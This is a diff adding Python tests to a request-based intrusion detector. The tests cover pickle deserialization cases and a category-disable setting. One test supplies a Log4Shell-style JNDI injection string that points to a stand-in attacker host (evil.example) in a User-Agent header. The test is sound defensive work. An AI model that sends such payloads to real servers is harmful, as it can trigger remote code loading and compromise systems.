+_BYTE_SENSITIVE_DESERIALIZATION_CASE_IDS = frozenset(
+    {
+        "deserialization_pickle_global_opcode_proto_header_prefixed",
+        "deserialization_pickle_global_opcode_newtrue_prefixed",
+    }
+)
+
+
+def test_byte_sensitive_deserialization_detected_via_every_mechanism() -> None:
+    byte_sensitive_cases = [
+        case
+        for case in MALICIOUS_CORPUS
+        if case.case_id in _BYTE_SENSITIVE_DESERIALIZATION_CASE_IDS
+    ]
+    assert {
+        case.case_id for case in byte_sensitive_cases
+    } == _BYTE_SENSITIVE_DESERIALIZATION_CASE_IDS
+
+    failures = [
+        f"{case.case_id}[{mechanism}]"
+        for case in byte_sensitive_cases
+        for mechanism in _BODY_MECHANISMS
+        if not _detected_via(mechanism, case.payload)
+    ]
+    assert not failures, failures
+
+
+def test_always_scan_header_shield_honors_disabled_cmd_injection_category() -> None:
+    disabled_config = SecurityConfig(enabled_detection_categories={"xss"})
+    request = _user_agent_header_request("${jndi:ldap://evil.example/a}")
+
+    result = detect_penetration_attempt(request, disabled_config)
+
+    assert result.is_threat is False
